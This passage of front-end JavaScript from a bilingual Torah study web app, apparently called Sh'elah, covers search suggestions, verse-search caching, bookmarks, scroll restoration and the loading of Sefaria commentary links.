            searchInput?.setAttribute('aria-expanded', 'false');
            searchInput?.removeAttribute('aria-activedescendant');
            dismissSearchSuggestions();
            setSuggestStatus('');
        }

        function setSuggestStatus(text) {
            const status = document.getElementById('searchSuggestStatus');
            if (status && status.textContent !== text) status.textContent = text;
        }

        function suggestCountLabel(n) {
            if (!n) return t('No suggestions', 'אין הצעות');
            if (n === 1) return t('1 suggestion', 'הצעה אחת');
            return t(`${n} suggestions`, `${n} הצעות`);
        }

        // Words of a verse, not a reference or a name: two or more words, no
        // digits ("Genesis 1:3" is a reference the suggest list already has).
        function wantsVerseSearch(q) {
            const words = q.split(/\s+/).filter(Boolean);
            return words.length >= 2 && !/\d/.test(q) && (q.match(/\p{L}/gu) || []).length >= 3;
        }

        // Verse results per query, for this page's life: retyping or going
        // back a word is instant. Pointing is ignored, as the server does.
        const verseSearchCache = new Map();
        const VERSE_CACHE_MAX = 40;
        const verseCacheKey = (q) => q.normalize('NFC').replace(/[֑-ׇ]/g, '').replace(/\s+/g, ' ').trim().toLowerCase();

        async function fetchVerseResults(q, signal) {
            const key = verseCacheKey(q);
            if (verseSearchCache.has(key)) return verseSearchCache.get(key);
            const params = new URLSearchParams({ q, size: '5' });
            const resp = await fetch(`/api/search/verses?${params.toString()}`, signal ? { signal } : undefined);
            if (!resp.ok) return null;
            const body = await resp.json();
            const data = {
                close: Boolean(body?.close),
                results: Array.isArray(body?.results) ? body.results.filter((r) => r?.ref) : [],
            };
            if (verseSearchCache.size >= VERSE_CACHE_MAX) verseSearchCache.delete(verseSearchCache.keys().next().value);
            verseSearchCache.set(key, data);
            return data;
        }

        const toVerseItem = (result) => ({
            type: 'verse',
            value: String(result.ref),
            label: String(result.ref),
            label_he: String(result.heRef || result.ref),
            lang: result.lang === 'he' ? 'he' : 'en',
            parts: Array.isArray(result.parts) ? result.parts : [],
            match: result.match === 'close' ? 'close' : 'exact',
            tanakh: Boolean(result.tanakh),
        });

        // References first, then verses, then the offer to ask; the
        // highlight stays on the same suggestion when the verses arrive.
        function showSuggestionItems(base) {
            const previous = appState.suggestionItems[appState.activeSuggestionIndex];
            const references = base.filter((item) => item.type !== 'ask');
            const asks = base.filter((item) => item.type === 'ask');
            const shown = new Set(references.filter((item) => item.type === 'text').map((item) => String(item.value)));
            const verses = (appState.verseSearch?.items || []).filter((item) => !shown.has(item.value));
            appState.suggestionItems = [...references, ...verses, ...asks];
            appState.activeSuggestionIndex = previous
                ? appState.suggestionItems.findIndex((item) => item.type === previous.type && item.value === previous.value)
                : -1;
            renderSearchSuggestions();
        }

        let suggestionAbort = null;

        // The verse group, once its request answers, under the reference list
        // already on screen.
        async function showVerseSuggestions(base, verseRequest, isCurrent) {
            const verses = await verseRequest;
            if (!isCurrent()) return;
            appState.verseSearch = {
                state: 'done',
                close: Boolean(verses?.close),
                items: (verses?.results || []).map(toVerseItem),
            };
            showSuggestionItems(base);
            setSuggestStatus(suggestCountLabel(appState.suggestionItems.length));
        }

        async function fetchOmniboxSuggestions(query) {
            const q = (query || '').trim();
            const fetchSerial = ++suggestionFetchSerial;
            // A newer query: the older one's requests are no longer wanted.
            suggestionAbort?.abort();
            suggestionAbort = null;

            if (suppressSuggestionMenu || q.length < 2) {
                hideSearchSuggestions();
                return;
            }

            const controller = typeof AbortController === 'function' ? new AbortController() : null;
            suggestionAbort = controller;
            const init = controller ? { signal: controller.signal } : undefined;
            const isCurrent = () => !suppressSuggestionMenu && fetchSerial === suggestionFetchSerial;

            // Said only when the answer is slow, so fast typing stays quiet.
            const searchingNote = setTimeout(() => {
                if (fetchSerial === suggestionFetchSerial) setSuggestStatus(t('Searching…', 'מחפש…'));
            }, 400);
            const versesWanted = wantsVerseSearch(q);
            try {
                const params = appendMetadataFilters(new URLSearchParams({ q, size: '8' }));
                const suggestRequest = fetch(`/api/search/suggest?${params.toString()}`, init);
                const verseRequest = versesWanted
                    ? fetchVerseResults(q, controller?.signal).catch(() => null)
                    : Promise.resolve(null);

                const resp = await suggestRequest;
                if (!resp.ok && !versesWanted) {
                    hideSearchSuggestions();
                    return;
                }
                const results = resp.ok ? await resp.json() : [];
                if (!isCurrent()) return;
                const base = Array.isArray(results) ? results : [];
                appState.activeSuggestionIndex = -1;
                appState.verseSearch = { state: versesWanted ? 'loading' : 'idle', close: false, items: [] };
                appState.suggestionItems = [];
                showSuggestionItems(base);
                if (!versesWanted) {
                    setSuggestStatus(suggestCountLabel(base.length));
                    return;
                }

                await showVerseSuggestions(base, verseRequest, isCurrent);
            } catch (error) {
                if (!isCurrent() || error?.name === 'AbortError') return;
                hideSearchSuggestions();
                logReliability('suggestions-error');
            } finally {
                clearTimeout(searchingNote);
                if (suggestionAbort === controller) suggestionAbort = null;
            }
        }

        function addRecentItem(item) {
            if (!item?.type || !item.value) return;
            const shelf = getShelfData();
            const key = `${item.type}:${item.value}`;
            shelf.recent = shelf.recent.filter(i => `${i.type}:${i.value}` !== key);
            shelf.recent.unshift(item);
            shelf.recent = shelf.recent.slice(0, 10);
            saveShelfData(shelf);
            renderPersonalShelf();
        }

        // Views this maps route the URL when the caller switches to them;
        // 'ask' is deliberately excluded -- AI answers are routed by their
        // own history_id (see handleAiSearch), not by question text.
        const ROUTE_TYPE_FOR_VIEW = { text: 'text', prayer: 'prayer', community: 'community', siddur: 'siddur', history: 'history' };
        // The /history page is where you find things, not something you read:
        // it stays out of Recent.
        const VIEWS_KEPT_OUT_OF_RECENT = new Set(['history']);

        // The tab title for the view on screen. The server renders an
        // English one per URL (backend/page_meta.py, same "<view> · Sh'elah"
        // shape); this localizes it and keeps it current in-app.
        // (A function declaration with no outer const: toggleLanguage calls
        // it during boot, before this line has run.)
        function syncDocumentTitle() {
            const maxLabel = 70;
            const view = appState.currentView;
            // An answer opens as a modal over the page underneath, and closing
            // it leaves currentView alone, so the tab keeps that page's title.
            if (view?.type === 'ask') return;
            let label = String((view?.type === 'text' && window.currentTextAnchorTitle) || view?.label || '').trim();
            if (label.length > maxLabel) label = `${label.slice(0, maxLabel - 1).trimEnd()}…`;
            document.title = label
                ? `${label} · ${t("Sh'elah", 'שאלה')}`
                : t("Sh'elah - Torah Encyclopedia", 'שאלה - אנציקלופדיית תורה');
        }

        // The views whose page Sh'elah composes itself; every other view is
        // Sefaria's text or one of the app's own pages (history), neither of
        // which is a synthesis.
        const COMPOSED_VIEWS = new Set(['community']);

        function setCurrentView(type, value, label, options = {}) {
            // Leaving the siddur stops its scroll tracking and lets go of a
            // screen wake lock (static/js/siddur.js close); an answer panel
            // over it ('ask') doesn't leave it.
            if (type !== 'siddur' && type !== 'ask') window.ShelahSiddur?.close();
            // "Sh'elah Synthesis" would claim Sefaria's own text (a verse, a
            // prayer, the siddur) or a plain page (history) as the app's
            // writing; it shows only once a page Sh'elah composes itself has loaded.
            if (type !== 'ask') {
                document.getElementById('readerKindBadge')?.classList.toggle('hidden', !COMPOSED_VIEWS.has(type));
                // Styling hook (siddur.css sets the siddur's own title size).
                document.getElementById('reader')?.setAttribute('data-view', type);
                // The siddur sets its own type and lists: the markdown "prose"
                // rhythm (ai.css) is for composed answers, and every rule
                // the siddur needs would otherwise have to outrank it.
                document.getElementById('readerContent')?.classList.toggle('prose', type !== 'siddur');
            }
            appState.currentView = { type, value, label: label || value };
            // 'ask' is the answer panel over the page, not the page.
            if (type !== 'ask') {
                leaveViewScroll();
                appState.shownView = { type, value, view: appState.currentView };
            }
            // state.js subscribers see every view change, not only the ones
            // made through setState() (appState is state.js's store object).
            window.ShelahState?.setState({ currentView: appState.currentView });
            if (type !== 'history') closeAskHistoryPage();
            appState.readingState = {
                ...appState.readingState,
                last_type: type,
                last_value: value,
                last_label: label || value,
                last_opened_at: new Date().toISOString(),
            };
            if (!VIEWS_KEPT_OUT_OF_RECENT.has(type)) addRecentItem(appState.currentView);
            updateBookmarkButton();

            const routeKey = ROUTE_TYPE_FOR_VIEW[type];
            if (routeKey && !options.fromRoute && window.ShelahRouter) {
                window.ShelahRouter.pushRoute({ [routeKey]: value, ...readerDisplayRoutePatch() }, { exclusive: true });
            } else if (type === 'text') {
                syncReaderDisplayRoute();
            }
            syncDocumentTitle();
        }

        // Export/citation controls only make sense with an open text chapter
        // to export (buildCurrentCitationExportPayload() requires
        // currentView.type === 'text'); keep them out of the settings panel
        // on every other page instead of showing a control that just alerts.
        function updateExportControlsVisibility() {
            const showExport = appState.currentView?.type === 'text';
            document.querySelectorAll('.export-text-only').forEach((el) => {
                el.classList.toggle('hidden', !showExport);
            });
        }

        function updateBookmarkButton() {
            updateExportControlsVisibility();
            const current = appState.currentView;
            if (!current || !bookmarkCurrentBtn) {
                bookmarkCurrentBtn.textContent = t('Save Current', 'שמור נוכחי');
                return;
            }

            const shelf = getShelfData();
            const key = `${current.type}:${current.value}`;
            const exists = shelf.bookmarks.some(i => `${i.type}:${i.value}` === key);
            bookmarkCurrentBtn.textContent = exists
                ? t('Saved', 'נשמר')
                : t('Save Current', 'שמור נוכחי');
            bookmarkCurrentBtn.classList.toggle('bg-emerald-700', exists);
            bookmarkCurrentBtn.classList.toggle('bg-navy', !exists);
        }

        function toggleBookmarkCurrent() {
            const current = appState.currentView;
            if (!current) return;

            const shelf = getShelfData();
            const key = `${current.type}:${current.value}`;
            const exists = shelf.bookmarks.some(i => `${i.type}:${i.value}` === key);

            if (exists) {
                shelf.bookmarks = shelf.bookmarks.filter(i => `${i.type}:${i.value}` !== key);
            } else {
                shelf.bookmarks.unshift(current);
                shelf.bookmarks = shelf.bookmarks.slice(0, 20);
            }

            saveShelfData(shelf);
            renderPersonalShelf();
            updateBookmarkButton();
        }

        function getSemanticBookmarkPayload() {
            const current = appState.currentView;
            if (current?.type !== 'text' || !String(current.value || '').trim()) {
                return null;
            }

            const segmentText = (Array.isArray(window.currentTextPayload?.lines)
                ? window.currentTextPayload.lines
                    .map((line) => {
                        if (!line || typeof line !== 'object') return '';
                        const preferred = isHebrewMode()
                            ? (line.he || line.en)
                            : (line.en || line.he);
                        return normalizeDisplayText(preferred || '');
                    })
                    .filter(Boolean)
                    .join(' ')
                    .trim()
                : '');

            if (!segmentText) {
                return null;
            }

            return {
                ref: String(current.value || '').trim(),
                label: String(current.label || current.value || '').trim(),
                segment_text: segmentText.slice(0, 6000),
                notes: '',
            };
        }

        function setSemanticBookmarkBusy(isBusy) {
            const semanticBookmarkButton = document.getElementById('semanticBookmarkBtn');
            if (!semanticBookmarkButton) return;
            semanticBookmarkButton.disabled = Boolean(isBusy);
            semanticBookmarkButton.textContent = isBusy
                ? t('Saving Note...', 'שומר הערה...')
                : t('Save Study Note', 'שמור הערת לימוד');
        }

        async function saveSemanticBookmark() {
            const payload = getSemanticBookmarkPayload();
            if (!payload) {
                window.alert(t('Open a text and optionally highlight a passage first.', 'פתח טקסט ובחר קטע לפני שמירת הערת לימוד.'));
                return;
            }

            if (isClerkConfigured() && !window.Clerk?.user) {
                await handleSignIn();
                return;
            }

            setSemanticBookmarkBusy(true);
            try {
                let headers = await authHeaders({ 'Content-Type': 'application/json' });
                let response = await fetch('/api/bookmarks/semantic', {
                    method: 'POST',
                    headers,
                    body: JSON.stringify(payload),
                });

                if (response.status === 401) {
                    headers = await authHeaders({ 'Content-Type': 'application/json' });
                    response = await fetch('/api/bookmarks/semantic', {
                        method: 'POST',
                        headers,
                        body: JSON.stringify(payload),
                    });
                }

                const data = await response.json().catch(() => ({}));
                if (response.status === 401) {
                    window.alert(t('Please sign in to save study notes.', 'יש להתחבר כדי לשמור הערות לימוד.'));
                    return;
                }
                if (!response.ok) {
                    throw new Error(data?.error || `HTTP ${response.status}`);
                }

                const summary = String(data?.item?.ai_summary || '').trim();
                const summaryError = String(data?.summary_error || '').trim();
                if (summary) {
                    window.alert(`${t('Study note saved. Summary:', 'הערת לימוד נשמרה. סיכום:')} ${summary.slice(0, 260)}`);
                } else if (summaryError) {
                    window.alert(t('Study note saved, but AI summary is currently unavailable.', 'הערת הלימוד נשמרה, אך סיכום ה-AI אינו זמין כרגע.'));
                } else {
                    window.alert(t('Study note saved.', 'הערת לימוד נשמרה.'));
                }
            } catch (error) {
                window.alert(`${t('Could not save study note:', 'לא ניתן לשמור הערת לימוד:')} ${error.message || error}`);
            } finally {
                setSemanticBookmarkBusy(false);
            }
        }

        // NOTE (a11y): the active-row type label below used text-[#7a684f],
        // 4.48:1 against this row's active bg #f2eadc — just under the 4.5:1
        // AA text threshold. Darkened to #6f5e46 (5.22:1), same warm-brown family.
        function renderShelfList(items, bucket = 'recent') {
            if (!items.length) {
                return `<p class="text-xs italic text-slate-400">${t('No items yet.', 'אין פריטים עדיין.')}</p>`;
            }

            const current = appState.currentView;
            const currentKey = current ? `${current.type}:${current.value}` : '';
            const alignClass = isHebrewMode() ? 'text-end' : 'text-start';

            return items.map((item) => {
                const itemKey = `${item.type}:${item.value}`;
                const isActive = Boolean(currentKey) && itemKey === currentKey;
                const displayLabel = getShelfDisplayLabel(item) || String(item.label || item.value || '').trim();
                const buttonClass = isActive
                    ? `shelf-open shelf-open-active w-full ${alignClass} px-2 py-1 rounded-sm border border-[#d7c8ad] bg-[#f2eadc] transition`
                    : `shelf-open w-full ${alignClass} px-2 py-1 rounded-sm hover:bg-slate-100 transition`;

                return `
                    <button class="${buttonClass}"
                        data-type="${escapeHtml(item.type)}"
                        data-value="${escapeHtml(item.value)}"
                        data-shelf-bucket="${escapeHtml(bucket)}"
                        data-label="${escapeHtml(item.label || item.value)}">
                        <span class="text-xs ${isActive ? 'text-[#4f4130] font-semibold' : 'text-slate-700'} block truncate">${escapeHtml(displayLabel)}</span>
                        <span class="text-[10px] uppercase tracking-widest ${isActive ? 'text-[#6f5e46]' : 'text-slate-400'}">${escapeHtml((UI_TYPE_LABELS[getCurrentLanguage()] || UI_TYPE_LABELS.en)[item.type] || item.type)}</span>
                    </button>
                `;
            }).join('');
        }

        function renderPersonalShelf() {
            const shelf = getShelfData();
            personalShelf.innerHTML = `
                <div class="space-y-4">
                    <div>
                        <div class="flex justify-between items-center mb-2">
                            <h4 class="text-xs font-bold uppercase tracking-wider text-slate-500">${t('Bookmarks', 'סימניות')}</h4>
                        </div>
                        <div class="space-y-1">${renderShelfList(shelf.bookmarks.slice(0, 6), 'bookmarks')}</div>
                    </div>
                    <div>
                        <div class="flex justify-between items-center mb-2">
                            <h4 class="text-xs font-bold uppercase tracking-wider text-slate-500">${t('Recent', 'אחרונים')}</h4>
                            <button type="button" class="text-[10px] text-slate-400 hover:text-slate-700" data-action="clear-recents">${t('Clear', 'נקה')}</button>
                        </div>
                        <p class="text-[10px] text-slate-400 mb-1">${t('Right-click an item to remove it.', 'לחיצה ימנית להסרת פריט.')}</p>
                        <div class="space-y-1">${renderShelfList(shelf.recent.slice(0, 6), 'recent')}</div>
                    </div>
                </div>
            `;
        }

        function getNormalizedReaderLayout(layout = appState.prefs.readerLayout) {
            if (layout === 'stacked') {
                return 'interleaved';
            }

            const supportedLayouts = ['bilingual', 'bilingual-reverse', 'interleaved', 'english', 'hebrew'];
            const normalized = supportedLayouts.includes(layout) ? layout : 'bilingual';

            // Side-by-side dual columns are not readable on narrow mobile viewports.
            if (isMobileViewport() && (normalized === 'bilingual' || normalized === 'bilingual-reverse')) {
                return 'interleaved';
            }

            return normalized;
        }

        function isDualColumnReaderLayout(layout = appState.prefs.readerLayout) {
            const normalized = getNormalizedReaderLayout(layout);
            return normalized === 'bilingual' || normalized === 'bilingual-reverse';
        }

        // Finds the reader chunk nearest the viewport's top edge (the first one
        // whose bottom hasn't scrolled past it yet) and a tracking key for it.
        function getReaderScrollAnchor() {
            const chain = getCurrentTextPayloadChain();
            const chunkEls = document.querySelectorAll('#readerSources [data-text-chunk-index]');
            for (const el of chunkEls) {
                const rect = el.getBoundingClientRect();
                if (rect.bottom > 0) {
                    const chunk = chain[Number(el.dataset.textChunkIndex)];
                    const refKey = getRefTrackingKey(chunk?.ref || chunk?.title || '');
                    if (refKey) return { el, refKey, viewportTop: rect.top };
                    break;
                }
            }
            return null;
        }

        function captureReaderScrollState() {
            const target = getPrimaryScrollElement();
            const pageTarget = target === document.documentElement || target === document.body;
            const top = getPrimaryScrollTop();

            // Anchor to a specific chunk rather than a raw pixel offset.
            // loadPreviousTextChunk() prepends a new chunk above the current
            // one, which pushes every already-rendered chunk (and whatever
            // scrollTop used to line up with them) down by the prepended
            // chunk's height; restoring the old raw scrollTop after that lands
            // on unrelated, much-earlier content -- the "scrolling up jumps
            // several passages" bug. Restoring the SAME chunk to the SAME
            // position relative to the viewport, instead of the same pixel
            // offset, keeps the same text in view regardless of how much was
            // prepended above it (and is a no-op for appends, since nothing
            // above the anchor moves).
            const anchor = getReaderScrollAnchor();

            return {
                pageTarget,
                top,
                anchorRefKey: anchor?.refKey || null,
                anchorViewportTop: anchor?.viewportTop ?? null,
            };
        }

        function restoreReaderScrollState(state) {
            if (!state) return;

            const target = state.pageTarget
                ? (document.scrollingElement || document.documentElement)
                : getPrimaryScrollElement();
            const pageTarget = target === document.documentElement || target === document.body;

            let nextTop = state.top;

            if (state.anchorRefKey) {
                const chain = getCurrentTextPayloadChain();
                const chunkEls = document.querySelectorAll('#readerSources [data-text-chunk-index]');
                for (const el of chunkEls) {
                    const chunk = chain[Number(el.dataset.textChunkIndex)];
                    const refKey = getRefTrackingKey(chunk?.ref || chunk?.title || '');
                    if (refKey === state.anchorRefKey) {
                        const currentTop = pageTarget ? (window.pageYOffset || 0) : target.scrollTop;
                        const newViewportTop = el.getBoundingClientRect().top;
                        nextTop = currentTop + (newViewportTop - state.anchorViewportTop);
                        break;
                    }
                }
            }

            const max = pageTarget
                ? Math.max(0, (document.documentElement.scrollHeight || 0) - window.innerHeight)
                : Math.max(0, target.scrollHeight - target.clientHeight);
            const clampedTop = Math.max(0, Math.min(max, Math.round(nextTop || 0)));

            if (pageTarget) {
                window.scrollTo({ top: clampedTop, behavior: 'instant' });
                return;
            }

            target.scrollTo({ top: clampedTop, behavior: 'instant' });
        }

        function formatSegmentLabel(segment, idx) {
            const fallback = String(idx + 1);
            if (!segment) return fallback;

            const raw = String(segment).trim();
            if (!raw) return fallback;

            const parts = raw.split('.').filter(Boolean);
            const lastPart = parts.at(-1) || raw;
            const digitMatch = /\d+/.exec(lastPart);

            if (digitMatch && Number.isFinite(Number(digitMatch[0]))) {
                return String(Number(digitMatch[0]));
            }

            return fallback;
        }

        function buildSegmentReference(baseRef, segmentPath) {
            const ref = String(baseRef || '').trim();
            const segment = String(segmentPath || '').trim();
            if (!ref) return '';
            if (!segment) return ref;

            const parts = segment.split('.').filter(Boolean);
            const leaf = parts.at(-1) || '';
            if (!leaf) return ref;

            if (ref.includes(':')) {
                return ref;
            }

            // Most Tanakh/Torah style refs resolve as chapter:verse from a chapter base ref.
            return `${ref}:${leaf}`;
        }

        function resetSelectionInsights(message = '') {
            if (!selectionInsightsBody || !selectionInsightsHint) return;
            selectionInsightsHint.textContent = message
                || t(
                    'Highlight a passage to load linked commentaries. Highlight one word to see its meaning.',
                    'סמן קטע כדי לטעון מפרשים מקושרים. סמן מילה אחת כדי לראות את פירושה.'
                );
            selectionInsightsBody.innerHTML = '';
        }

        const READER_COMMENTARY_HINT_KEY = 'shelahCommentaryHintSeen';

        // One-time "there's something here" pulse on the reader topbar's
        // Commentary button (see .reader-topbar-commentary-hint-dot in
        // style.css) -- cleared the first time commentary actually becomes
        // available, whether the user found it via a real text selection or
        // by clicking the button itself.
        function markCommentaryHintSeen() {
            if (readerCommentaryTopBarBtn) {
                readerCommentaryTopBarBtn.classList.remove('has-hint');
            }
            try {
                localStorage.setItem(READER_COMMENTARY_HINT_KEY, '1');
            } catch {
                // Private browsing / storage disabled -- pulse just won't persist across reloads.
            }
        }

        function updateCommentaryHintVisibility() {
            if (!readerCommentaryTopBarBtn) return;
            let seen = false;
            try {
                seen = Boolean(localStorage.getItem(READER_COMMENTARY_HINT_KEY));
            } catch {
                seen = false;
            }
            readerCommentaryTopBarBtn.classList.toggle('has-hint', !seen);
        }

        function setCommentaryAvailability(hasAvailable) {
            commentaryAvailableForCurrentSelection = Boolean(hasAvailable);
            if (commentaryAvailableForCurrentSelection) {
                markCommentaryHintSeen();
            }
        }

        function clearSelectionCommentaryState() {
            selectionCommentaryState.groupedCommentaries = [];
            selectionCommentaryState.wordInfo = null;
            selectionCommentaryState.selectedText = '';
            selectionCommentaryState.activeCommentaryRef = '';
            selectionCommentaryState.mode = 'selection';
            selectionCommentaryState.readingRef = '';
            setCommentaryAvailability(false);
        }

        function isCommentaryEligiblePrimaryText() {
            const categories = Array.isArray(window.currentTextPayload?.categories)
                ? window.currentTextPayload.categories
                : [];
            if (!categories.length) return false;

            const categoryBlob = categories
                .map((item) => String(item || '').toLowerCase())
                .join(' ');

            return /(tanakh|torah|prophets|writings|mishnah|talmud)/.test(categoryBlob);
        }

        function hideSelectionInsights() {
            selectionInsights?.classList.add('hidden');
        }

        function showSelectionInsights() {
            selectionInsights?.classList.remove('hidden');
        }

        function collapseCommentaryPanel() {
            clearSelectionCommentaryState();
            hideSelectionInsights();
            if (isMobileViewport()) {
                if (rightSidebar?.classList.contains('mobile-open')) {
                    closeMobilePanels();
                }
                return;
            }
            setSidebarVisibility('right', false);
        }

        // Sefaria links a commentary one passage at a time ("Rashi on Genesis
        // 1:1:1", ":2", ":3"), but those passages are one comment on the verse.
        // It is listed once, under the ref without the passage number ("Rashi
        // on Genesis 1:1"), and that ref's own text holds all of its passages.
        const COMMENTARY_PASSAGE_RE = /^(\d+[ab]?:\d+)((?::\d+(?:-\d+)?)+)$/;
        const COMMENTARY_PASSAGE_RANGE_LIMIT = 1000;

        // The ref a passage belongs to, how many numbers it dropped, and the
        // passage numbers it names (a ":9-11" range names three; null for a ref
        // that is not a passage or for one nested deeper than a single number).
        function splitCommentaryPassage(raw) {
            const cut = raw.lastIndexOf(' ') + 1;
            const match = COMMENTARY_PASSAGE_RE.exec(raw.slice(cut));
            if (!match) return { ref: raw, depth: 0, passages: null };
            const tail = match[2].slice(1).split(':');
            let passages = null;
            if (tail.length === 1) {
                const [from, to = from] = tail[0].split('-').map(Number);
                passages = to >= from && to - from < COMMENTARY_PASSAGE_RANGE_LIMIT
                    ? Array.from({ length: to - from + 1 }, (_, index) => from + index)
                    : [from];
            }
            return { ref: raw.slice(0, cut) + match[1], depth: tail.length, passages };
        }

        // ref -> the passage numbers the links name (a Set), or null when the
        // ref is linked whole. A section can hold passages that belong to other
        // verses, so a view shows only the ones that were linked.
        const commentaryLinkedPassages = new Map();

        function noteLinkedPassages(linked, ref, passages) {
            if (passages === null) {
                linked.set(ref, null);
                return;
            }
            if (linked.get(ref) === null) return;
            const known = linked.get(ref) || new Set();
            passages.forEach((number) => known.add(number));
            linked.set(ref, known);
        }

        // Sefaria's Hebrew ref of the first passage, without its passage numbers.
        function hebrewRefWithoutPassages(heRef, depth) {
            const raw = String(heRef || '').trim();
            const parts = raw.split(':');
            return parts.length > depth ? parts.slice(0, parts.length - depth).join(':') : '';
        }

        function extractCommentaryRefs(linkData) {
            if (!linkData || typeof linkData !== 'object') return [];

            const refs = [];
            const seen = new Set();
            const linked = new Map();

            // Commentary before Targum before Midrash, whatever order the
            // payload's keys arrive in. "Quoting Commentary" is works that
            // cite this verse while commenting on another one -- not a
            // commentary on it. The list used to stop at the first 24 refs,
            // which on Genesis 1:1 kept six commentators and dropped Rashi.
            const categoryRank = (category) => {
                const name = String(category || '');
                if (/quoting/i.test(name)) return -1;
                if (/^commentary$/i.test(name)) return 0;
                if (/commentary|supercommentary|parshan/i.test(name)) return 1;
                if (/targum/i.test(name)) return 2;
                if (/midrash/i.test(name)) return 3;
                return -1;
            };
            Object.entries(linkData)
                .map(([category, items]) => ({ rank: categoryRank(category), items }))
                .filter(({ rank, items }) => rank >= 0 && Array.isArray(items))
                .sort((a, b) => a.rank - b.rank)
                .forEach(({ items }) => {
                    items.forEach((item) => {
                        const raw = String(item?.ref || '').trim();
                        if (!raw) return;
                        const { ref, depth, passages } = splitCommentaryPassage(raw);
                        noteLinkedPassages(linked, ref, passages);
                        const key = ref.toLowerCase();
                        if (seen.has(key)) return;
                        seen.add(key);
                        refs.push(ref);
                        const heRef = depth ? hebrewRefWithoutPassages(item?.heRef, depth) : String(item?.heRef || '').trim();
                        const en = String(item?.collectiveTitle?.en || '').trim();
                        const he = String(item?.collectiveTitle?.he || '').trim();
                        if (heRef || en || he) commentaryRefMeta.set(ref, { heRef, en, he });
                    });
                });
            linked.forEach((passages, ref) => commentaryLinkedPassages.set(ref, passages));

            // Safety bound only: a Talmud daf can carry thousands of links.
            return refs.slice(0, COMMENTARY_REF_LIMIT);
        }

        const COMMENTARY_REF_LIMIT = 800;

        // Commentators readers look for first; everything else follows in
        // link-category order (commentary, targum, midrash), then A-Z.
        const COMMENTARY_PRIORITY = [
            'Rashi', 'Onkelos', 'Ramban', 'Ibn Ezra', 'Rashbam', 'Sforno', 'Radak', 'Or HaChaim',
            'Kli Yakar', "Ba'al HaTurim", 'Rabbeinu Bahya', 'Chizkuni', "Da'at Zekenim", 'Abarbanel',
            'Malbim', 'Haamek Davar', 'Siftei Chakhamim', 'Mizrachi', 'Gur Aryeh', 'Torah Temimah',
            'Rav Hirsch', 'Shadal', 'Steinsaltz',
            'Bartenura', 'Tosafot Yom Tov', 'Rambam', 'Ikar Tosafot Yom Tov', 'Tosafot', 'Rashba',
            'Ritva', 'Maharsha', 'Mishnah Berurah', 'Magen Avraham', 'Turei Zahav', "Ba'er Hetev",
            'Beur HaGra', "Sha'arei Teshuvah",
        ];
        const COMMENTARY_PRIORITY_RANK = new Map(COMMENTARY_PRIORITY.map((name, index) => [name.toLowerCase(), index]));

        // Sephardi and Mizrahi readers see the Kaf HaChayim just ahead of the
        // Mishnah Berurah on a Shulchan Arukh page (an Ashkenazi reader keeps
        // the shared order, which the server's preload also follows).
        const SEPHARDI_HALACHA_FIRST = ['kaf hachayim', 'ben ish hai'];
        function commentaryRank(base) {
            if ((window.ShelahState?.getMinhag?.() || 'sephardi') !== 'ashkenazi') {
                const early = SEPHARDI_HALACHA_FIRST.indexOf(base);
                if (early !== -1) return COMMENTARY_PRIORITY_RANK.get('mishnah berurah') - 1 + (early + 1) / 10;
            }
            return COMMENTARY_PRIORITY_RANK.has(base) ? COMMENTARY_PRIORITY_RANK.get(base) : Infinity;
        }

        function getCommentaryAuthorBase(ref) {
            const raw = String(ref || '').trim();
            const sefariaTitle = commentaryRefMeta.get(raw)?.en;
            // Sefaria titles the Targum per book ("Onkelos Genesis"); one
            // "Onkelos" key ranks and groups it across the Chumash.
            if (sefariaTitle) return sefariaTitle.replace(/^Onkelos\s+(?:Genesis|Exodus|Leviticus|Numbers|Deuteronomy)$/i, 'Onkelos');
            const onMatch = /^([^,\s]+(?:\s+[^,\s]+)*?)\s+on\s+/i.exec(raw);
            if (onMatch?.[1]) return onMatch[1].trim();
            // "Bereshit Rabbah 1:5", "Targum Neofiti 1:1": drop the section
            // numbers so every passage of one work lands in one group.
            const base = raw.split(',')[0]?.trim() || raw;
            return base.replace(TRAILING_SECTION_RE, '$1').trim() || base;
        }

        function commentaryBucket(ref) {
            if (/\son\s/i.test(ref)) return 0;
            if (/^(?:onkelos|targum|tafsir)\b/i.test(ref)) return 1;
            return 2;
        }

        // Bounded caches for the commentary sidebar -- reselecting the same
        // passage/commentary previously re-ran the full network chain every
        // time (Sefaria fetch + on-demand translation on the backend, see
        // backend/helpers.py::_fill_missing_english_lines), which was the
        // main contributor to the sidebar feeling "extremely slow and
        // unresponsive." Same bounded-eviction shape as textPayloadCache
        // above (cacheTextPayload) for consistency.
        const commentaryLinksCache = new Map();
        const commentaryTextCache = new Map();

        function _cacheBounded(map, key, value, max = 140) {
            if (!key) return;
            map.set(key, value);
            if (map.size <= max) return;
            const firstKey = map.keys().next().value;
            if (firstKey !== undefined) map.delete(firstKey);
        }

        async function fetchCommentaryLinksWithFallback(refCandidates) {
            const candidates = Array.isArray(refCandidates) ? refCandidates : [];
            const seen = new Set();
            const normalizedCandidates = [];

            for (const candidate of candidates) {
                const normalized = String(candidate || '').replace(/\s+/g, ' ').trim();
                if (!normalized) continue;
                const normalizedKey = normalized.toLowerCase();
                if (seen.has(normalizedKey)) continue;
                seen.add(normalizedKey);
                normalizedCandidates.push(normalized);
            }

            if (!normalizedCandidates.length) {
                return { links: {}, resolvedRef: '' };
            }

            // Walk the candidates in priority order (segment ref before
            // whole-verse before chapter-level fallback) and stop at the first
            // that has commentary. They used to all be requested at once, which
            // meant every selection also pulled the chapter's links -- ~1MB on
            // Sefaria -- although the verse itself nearly always has some.
            for (const normalized of normalizedCandidates) {
                const result = await fetchCommentaryLinks(normalized);
                if (result) return result;
            }
            return { links: {}, resolvedRef: '' };
        }

        // In-flight de-duplication: a pointerdown prefetch and the selection
        // lookup that follows it ~150ms later share one request.
        const commentaryLinksInflight = new Map();

        function httpStatusError(status) {
            return Object.assign(new Error(`HTTP ${status}`), { status });
        }

        // The sidebar endpoint serves just the commentary/targum/midrash refs,
        // cached on the server (backend/sidebar_bundle.py) -- a fraction of the
        // full /links payload (Genesis 1:1: 230KB against 700KB, every other
        // category dropped). The full payload remains the fallback if it is
        // unavailable, but not when it rate-limits us.
        async function fetchCommentaryLinksPayload(normalized) {
            try {
                const resp = await fetch(`/api/sidebar/${encodeURIComponent(normalized)}?stage=links`);
                if (resp.ok) return (await resp.json())?.links || {};
                if (resp.status === 429) throw httpStatusError(429);
            } catch (err) {
                if (err?.status === 429) throw err;
            }
            const resp = await fetch(`/api/text/${encodeURIComponent(normalized)}/links`);
            if (!resp.ok) throw httpStatusError(resp.status);
            return await resp.json();
        }

        // Resolves to {links, resolvedRef} (null when the ref has no
